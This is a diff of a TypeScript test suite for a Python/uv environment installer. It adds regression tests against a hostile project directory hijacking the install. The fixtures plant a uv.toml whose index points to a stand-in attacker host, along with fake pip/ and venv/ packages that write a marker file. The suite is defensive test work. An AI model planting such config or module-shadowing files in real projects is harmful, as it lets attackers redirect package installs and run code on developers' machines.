@@ -13,11 +13,12 @@
  */
 import './helpers/guard-real-home.ts';
 import assert from 'node:assert/strict';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { test } from 'node:test';
-import { MLX_AUDIO_VERSION, MLX_IMPORT_CODE, PYTHON_INSTRUCTION, detectPythonTooling, ensurePythonEnv, findPython, makeWhich, pythonEnvStatus, type RunResult, type RunTool } from '../lib/speak-python-env.ts';
+import { MLX_AUDIO_VERSION, MLX_IMPORT_CODE, PYTHON_INSTRUCTION, PYTHON_TOOL_FLAGS, defaultRunTool, detectPythonTooling, ensurePythonEnv, findPython, makeWhich, pythonEnvStatus, type RunResult, type RunTool } from '../lib/speak-python-env.ts';
 import { PYTHON_RECORD_FILE, resolveQwenPython } from '../lib/speak-voices-install.ts';
 import { QWEN_PYTHON_FLAGS } from '../lib/speak-voices.ts';
 
@@ -27,12 +28,13 @@ test.afterEach(() => { for (const root of roots.splice(0)) rmSync(root, { recurs
 const tmp = () => { const root = mkdtempSync(join(tmpdir(), 'gs-pyenv-')); roots.push(root); const home = join(root, '.gentle-speak'); mkdirSync(home, { recursive: true }); return { root, home }; };
 const ok = (stdout = ''): RunResult => ({ code: 0, stdout, stderr: '' });
 
-type Call = { command: string; args: string[]; env?: NodeJS.ProcessEnv };
+type Call = { command: string; args: string[]; env?: NodeJS.ProcessEnv; cwd?: string };
 /** A fake toolbox: `uv venv` and `python -m venv` create the interpreter file; pip installs succeed; the import prints the version. */
 function toolbox(o: { versions?: Record<string, string>; failVenv?: boolean; failUvVenv?: boolean; failInstall?: boolean; failImport?: boolean; mlx?: string } = {}) {
   const calls: Call[] = [];
   const run: RunTool = async (command, args, options) => {
-    calls.push({ command, args, env: options.env });
+    calls.push({ command, args: [...args], env: options.env, cwd: options.cwd });
+    if (args[0] === '-I') args = args.slice(1); // T61: the isolated-mode flag precedes -c / -m; the fake answers by what follows it
     const venvAt = (dir: string) => { mkdirSync(join(dir, 'bin'), { recursive: true }); writeFileSync(join(dir, 'bin', 'python'), '#!fake\n'); };
     if (command.endsWith('/uv')) {
       if (args[0] === 'venv') { if (o.failUvVenv || o.failVenv) return { code: 1, stdout: '', stderr: 'No interpreter found for Python 3.12' }; venvAt(args[args.length - 1]); return ok(); }
@@ -55,9 +57,9 @@ test('uv is preferred over venv: uv venv --python 3.12, uv pip install the pinne
   const out = await ensurePythonEnv({ home, confirmed: true, run: t.run, which: whichOf(['uv', 'python3']), platform: 'darwin', env: { HOME: '/real', HF_HOME: '/real/hf' }, onProgress: m => steps.push(m) });
   assert.equal(out.status, 'installed'); assert.equal(out.status === 'installed' && out.tool, 'uv');
   const venv = join(home, 'python'), py = join(venv, 'bin', 'python');
-  assert.deepEqual(t.calls.find(c => c.args[0] === 'venv'), { command: '/bin/uv', args: ['venv', '--python', '3.12', venv], env: { HOME: '/real', HF_HOME: '/real/hf' } });
-  assert.deepEqual(t.calls.find(c => c.args[0] === 'pip')!.args, ['pip', 'install', '--python', py, `mlx-audio==${MLX_AUDIO_VERSION}`]);
-  assert.equal(t.calls.some(c => c.args[0] === '-m'), false, 'no venv module when uv is present');
+  assert.deepEqual(t.calls.find(c => c.args[0] === 'venv'), { command: '/bin/uv', args: ['venv', '--no-config', '--python', '3.12', venv], env: { HOME: '/real', HF_HOME: '/real/hf', UV_NO_CONFIG: '1' }, cwd: home });
+  assert.deepEqual(t.calls.find(c => c.args[0] === 'pip')!.args, ['pip', 'install', '--no-config', '--python', py, `mlx-audio==${MLX_AUDIO_VERSION}`]);
+  assert.equal(t.calls.some(c => c.args.includes('-m')), false, 'no venv module when uv is present');
   assert.ok(steps.length >= 3, steps.join('|'));
 });
 
@@ -66,10 +68,10 @@ test('without uv, python3 -m venv of a Python >= 3.10 is used (the newest candid
   const t = toolbox({ versions: { python3: '3.9', 'python3.10': '3.10', 'python3.11': '3.11' } });
   const out = await ensurePythonEnv({ home, confirmed: true, run: t.run, which: whichOf(['python3', 'python3.10', 'python3.11']), platform: 'darwin', env: {} });
   assert.equal(out.status, 'installed'); assert.equal(out.status === 'installed' && out.tool, 'venv');
-  const made = t.calls.find(c => c.args[0] === '-m' && c.args[1] === 'venv')!;
-  assert.equal(made.command, '/bin/python3.11'); assert.deepEqual(made.args, ['-m', 'venv', join(home, 'python')]);
-  const install = t.calls.find(c => c.args[1] === 'pip')!;
-  assert.equal(install.command, join(home, 'python', 'bin', 'python')); assert.deepEqual(install.args, ['-m', 'pip', 'install', '--disable-pip-version-check', `mlx-audio==${MLX_AUDIO_VERSION}`]);
+  const made = t.calls.find(c => c.args[1] === '-m' && c.args[2] === 'venv')!;
+  assert.equal(made.command, '/bin/python3.11'); assert.deepEqual(made.args, ['-I', '-m', 'venv', join(home, 'python')]);
+  const install = t.calls.find(c => c.args[2] === 'pip')!;
+  assert.equal(install.command, join(home, 'python', 'bin', 'python')); assert.deepEqual(install.args, ['-I', '-m', 'pip', 'install', '--disable-pip-version-check', `mlx-audio==${MLX_AUDIO_VERSION}`]);
 });
 
 test('neither uv nor a suitable Python: an instruction and a skip; nothing is created, no package command runs', async () => {
@@ -79,7 +81,7 @@ test('neither uv nor a suitable Python: an instruction and a skip; nothing is cr
   assert.deepEqual(out, { status: 'skipped', instruction: PYTHON_INSTRUCTION });
   assert.match(PYTHON_INSTRUCTION, /uv/); assert.match(PYTHON_INSTRUCTION, /Python 3\.10/); assert.match(PYTHON_INSTRUCTION, /No instalo nada del sistema/);
   assert.equal(existsSync(join(home, 'python')), false); assert.equal(existsSync(join(home, PYTHON_RECORD_FILE)), false);
-  assert.equal(t.calls.every(c => c.args[0] === '-c' && c.args[1].includes('sys.version_info')), true, 'only version probes ran');
+  assert.equal(t.calls.every(c => c.args[0] === '-I' && c.args[1] === '-c' && c.args[2].includes('sys.version_info')), true, 'only version probes ran');
   assert.deepEqual(await detectPythonTooling({ which: whichOf([]), run: t.run }), { kind: 'none', instruction: PYTHON_INSTRUCTION });
 });
 
@@ -201,7 +203,7 @@ test('T49 R3-venv-pip-reuse: a leftover venv from a failed install whose interpr
     const t = toolbox({ versions: { python3: '3.12', ...versions } });
     const out = await ensurePythonEnv({ home, confirmed: true, run: t.run, which, platform: 'darwin', env: {} });
     assert.equal(out.status, 'installed', JSON.stringify(out));
-    const made = t.calls.find(c => c.args[0] === 'venv' || (c.args[0] === '-m' && c.args[1] === 'venv'));
+    const made = t.calls.find(c => c.args[0] === 'venv' || c.args.join(' ').includes('-m venv'));
     assert.ok(made, `recreated (${tooling}, ${JSON.stringify(versions)})`); assert.ok(made.args.includes('--clear'));
     assert.ok(t.calls.findIndex(c => c === made) < t.calls.findIndex(c => c.args.includes('install')), 'recreated before installing');
   }
@@ -215,4 +217,148 @@ test('T49 R3-venv-pip-reuse: a leftover venv with a healthy 3.10+ interpreter is
   const out = await ensurePythonEnv({ home, confirmed: true, run: t.run, which, platform: 'darwin', env: {} });
   assert.equal(out.status, 'installed');
   assert.equal(t.calls.some(c => c.args[0] === 'venv'), false); assert.equal(t.calls.some(c => c.args.includes('install')), true);
+});
+
+// ---- T61 (S15, L118): a hostile project directory must not steer the install (uv.toml, a planted pip/ or venv/ package) ----
+/** Runs `work` with `process.cwd()` set to `dir`, restoring it afterwards. */
+async function inside<T>(dir: string, work: () => Promise<T>): Promise<T> {
+  const before = process.cwd();
+  process.chdir(dir);
+  try { return await work(); } finally { process.chdir(before); }
+}
+/** A hostile checkout: `uv.toml` with a bogus index (and a field uv refuses, so reading it is visible offline), `pip/` and `venv/` packages that write a marker. */
+function hostileProject(root: string) {
+  const project = join(root, 'project'), marker = join(root, 'HIJACKED');
+  for (const pkg of ['pip', 'venv']) {
+    mkdirSync(join(project, pkg), { recursive: true });
+    const code = `open(${JSON.stringify(marker)}, "a").write(${JSON.stringify(pkg + '\n')})\n`;
+    writeFileSync(join(project, pkg, '__init__.py'), ''); writeFileSync(join(project, pkg, '__main__.py'), code);
+  }
+  writeFileSync(join(project, 'uv.toml'), 'index-url = "http://attacker.invalid/simple"\nhijack-canary = true\n');
+  return { project, marker };
+}
+
+test('T61: every install child (probes, venv, install, validation) runs in the shared home, never in process.cwd(); the home ends 0700', async () => {
+  for (const [label, names, o] of [['uv', ['uv'], {}], ['venv', ['python3.12'], { versions: { 'python3.12': '3.12' } }], ['uv fallback', ['uv', 'python3.11'], { failUvVenv: true, versions: { 'python3.11': '3.11' } }]] as const) {
+    const { root, home } = tmp();
+    const { project } = hostileProject(root);
+    const t = toolbox(o);
+    const out = await inside(project, () => ensurePythonEnv({ home, confirmed: true, run: t.run, which: whichOf([...names]), platform: 'darwin', env: {} }));
+    assert.equal(out.status, 'installed', label);
+    assert.ok(t.calls.length >= 3, label);
+    for (const call of t.calls) {
+      assert.equal(call.cwd, home, `${label}: ${call.command} ${call.args.join(' ')}`);
+      assert.notEqual(call.cwd, process.cwd(), label);
+    }
+    assert.equal(statSync(home).mode & 0o777, 0o700, label);
+  }
+});
+
+test('T61: every uv invocation carries --no-config and UV_NO_CONFIG=1; the caller env is kept', async () => {
+  for (const o of [{}, { failUvVenv: true, versions: { python3: '3.12' } }]) {
+    const { home } = tmp();
+    const t = toolbox(o);
+    await ensurePythonEnv({ home, confirmed: true, run: t.run, which: whichOf(['uv', 'python3']), platform: 'darwin', env: { HOME: '/real', KEEP: 'yes' } });
+    const uv = t.calls.filter(c => c.command.endsWith('/uv'));
+    assert.ok(uv.length >= 1);
+    for (const call of uv) {
+      assert.ok(call.args.includes('--no-config'), call.args.join(' '));
+      assert.equal(call.env?.UV_NO_CONFIG, '1'); assert.equal(call.env?.KEEP, 'yes'); assert.equal(call.env?.HOME, '/real');
+    }
+    for (const call of t.calls.filter(c => !c.command.endsWith('/uv'))) assert.equal(call.args.includes('--no-config'), false, 'only uv gets the uv flag');
+  }
+});
+
+test('T61: python -m venv, python -m pip and the version probes run in isolated mode (-I) on 3.10 and on 3.12; the import check keeps the worker flags', async () => {
+  assert.deepEqual([...PYTHON_TOOL_FLAGS], ['-I']);
+  for (const version of ['3.10', '3.12']) {
+    const { home } = tmp();
+    const name = `python${version}`;
+    const t = toolbox({ versions: { [name]: version, python: version } });
+    const out = await ensurePythonEnv({ home, confirmed: true, run: t.run, which: whichOf([name]), platform: 'darwin', env: {} });
+    assert.equal(out.status, 'installed', version);
+    const venv = t.calls.find(c => c.args.join(' ').includes('-m venv'))!, pip = t.calls.find(c => c.args.join(' ').includes('-m pip'))!;
+    assert.deepEqual(venv.args.slice(0, 3), ['-I', '-m', 'venv'], version); assert.deepEqual(pip.args.slice(0, 3), ['-I', '-m', 'pip'], version);
+    for (const probe of t.calls.filter(c => c.args.join(' ').includes('sys.version_info'))) assert.deepEqual(probe.args.slice(0, 2), ['-I', '-c'], version);
+    assert.equal(t.calls.some(c => c.args.includes('-P') && !c.args.join(' ').includes('load_model')), false, `${version}: -P (3.11+ only) is never passed to the tools`);
+    const check = t.calls.find(c => c.args.join(' ').includes('load_model'))!;
+    assert.deepEqual(check.args.slice(0, 2), [...QWEN_PYTHON_FLAGS], 'the import check keeps -E -P');
+  }
+});
+
+test('T61: makeWhich ignores relative and empty PATH entries (".", "bin", ""), so a project directory cannot shadow uv or python', async () => {
+  const { root } = tmp();
+  const make = (dir: string) => { mkdirSync(dir, { recursive: true }); for (const name of ['uv', 'python3']) writeFileSync(join(dir, name), '#!/bin/sh\n', { mode: 0o755 }); };
+  make(join(root, 'bin')); make(join(root, 'trusted'));
+  await inside(root, async () => {
+    for (const PATH of ['.', 'bin', '', ':', `.:bin::`]) assert.equal(makeWhich({ PATH }, 'linux')('uv'), undefined, JSON.stringify(PATH));
+    writeFileSync(join(root, 'uv'), '#!/bin/sh\n', { mode: 0o755 });
+    const which = makeWhich({ PATH: `.:bin::${join(root, 'trusted')}` }, 'linux');
+    assert.equal(which('uv'), join(root, 'trusted', 'uv')); assert.equal(which('python3'), join(root, 'trusted', 'python3'));
+  });
+  assert.equal(makeWhich({ PATH: 'bin;C:\\Python312' }, 'win32')('python'), undefined, 'win32: a relative entry is skipped and a missing absolute one finds nothing');
+});
+
+test('T61: defaultRunTool without a cwd runs the child in a fresh private directory (never process.cwd()) and removes it; with a cwd it uses that one', async () => {
+  const { root, home } = tmp();
+  const print = ['-e', 'process.stdout.write(process.cwd())'];
+  const there = await inside(root, () => defaultRunTool(process.execPath, print, { timeoutMs: 10_000 }));
+  assert.equal(there.code, 0);
+  assert.notEqual(there.stdout, realpathSync(root)); assert.notEqual(there.stdout, realpathSync(process.cwd()));
+  assert.equal(existsSync(there.stdout), false, 'the private directory is removed after the child exits');
+  const given = await defaultRunTool(process.execPath, print, { timeoutMs: 10_000, cwd: home });
+  assert.equal(given.stdout, realpathSync(home));
+});
+
+test('T61: hostile project regression: a planted pip/ or venv/ and a uv.toml in process.cwd() never run or steer the install (real python and uv, offline)', async () => {
+  const { root, home } = tmp();
+  const { project, marker } = hostileProject(root);
+  const python = await findPython({ which: makeWhich() });
+  const uv = makeWhich()('uv');
+  // The fixture is live: a plain `python -m pip` / `python -m venv` started in the project imports the planted package (the L118 attack).
+  if (python) {
+    for (const mod of ['pip', 'venv']) { try { execFileSync(python.python, ['-m', mod, '--version'], { cwd: project, stdio: 'ignore', timeout: 30_000 }); } catch { /* the planted module is not a real tool */ } }
+    assert.equal(readFileSync(marker, 'utf8'), 'pip\nvenv\n', 'the planted packages run when the cwd is the project'); rmSync(marker);
+  }
+  // Offline and hermetic: pip may not use an index, uv may not download, and every cache lives in the scratch root.
+  const env: NodeJS.ProcessEnv = {
+    PATH: process.env.PATH, HOME: join(root, 'fake-home'), TMPDIR: process.env.TMPDIR, PIP_NO_INDEX: '1', PIP_CONFIG_FILE: '/dev/null', PIP_CACHE_DIR: join(root, 'pip-cache'),
+    UV_OFFLINE: '1', UV_PYTHON_DOWNLOADS: 'never', UV_CACHE_DIR: join(root, 'uv-cache'), XDG_CACHE_HOME: join(root, 'xdg-cache'),
+  };
+  const seen: Array<{ command: string; args: string[]; cwd?: string; result: RunResult }> = [];
+  const real: RunTool = async (command, args, options) => {
+    if (args.join(' ').includes('load_model')) return { code: 1, stdout: '', stderr: 'ModuleNotFoundError: mlx_audio' }; // never imports a model
+    const result = await defaultRunTool(command, args, options);
+    seen.push({ command, args, cwd: options.cwd, result });
+    return result;
+  };
+  // A uv stand-in for machines without uv: it honours ./uv.toml exactly as uv does (cwd and ancestors), unless --no-config or UV_NO_CONFIG.
+  const fakeUvIndexes: string[] = [];
+  const emulated: RunTool = async (command, args, options) => {
+    seen.push({ command, args, cwd: options.cwd, result: ok() });
+    const configured = !args.includes('--no-config') && options.env?.UV_NO_CONFIG !== '1' && existsSync(join(options.cwd ?? process.cwd(), 'uv.toml'));
+    if (args[0] === 'pip') fakeUvIndexes.push(configured ? 'http://attacker.invalid/simple' : 'https://pypi.org/simple');
+    if (args[0] === 'venv') { mkdirSync(join(args[args.length - 1], 'bin'), { recursive: true }); writeFileSync(join(args[args.length - 1], 'bin', 'python'), '#!fake\n'); }
+    if (args.join(' ').includes('load_model')) return ok(`${MLX_AUDIO_VERSION}\n`);
+    return ok();
+  };
+  await inside(project, async () => {
+    const fake = await ensurePythonEnv({ home: join(root, 'emulated-home'), confirmed: true, run: emulated, which: whichOf(['uv']), platform: 'darwin', env });
+    assert.equal(fake.status, 'installed');
+    assert.deepEqual(fakeUvIndexes, ['https://pypi.org/simple'], 'the bogus index of ./uv.toml is never used');
+    if (python) {
+      const which = (name: string) => name === 'uv' ? undefined : makeWhich()(name);
+      const out = await ensurePythonEnv({ home, confirmed: true, run: real, which, platform: process.platform, env });
+      assert.equal(out.status, 'failed', 'offline: the install cannot complete'); // pip has no index; nothing was downloaded
+      assert.ok(existsSync(join(home, 'python', 'pyvenv.cfg')), 'python -I -m venv really created the environment');
+    }
+    if (uv) {
+      const uvHome = join(root, 'uv-home');
+      await ensurePythonEnv({ home: uvHome, confirmed: true, run: real, which: name => name === 'uv' ? uv : undefined, platform: process.platform, env });
+      for (const call of seen.filter(c => c.command === uv)) assert.doesNotMatch(call.result.stderr, /hijack-canary|uv\.toml|attacker/, `uv read the project config: ${call.args.join(' ')}`);
+    }
+  });
+  assert.equal(existsSync(marker), false, 'no planted module ran');
+  for (const call of seen) assert.notEqual(call.cwd, project, `${call.command} ${call.args.join(' ')} ran in the project`);
+  assert.ok(seen.length > 0);
 });
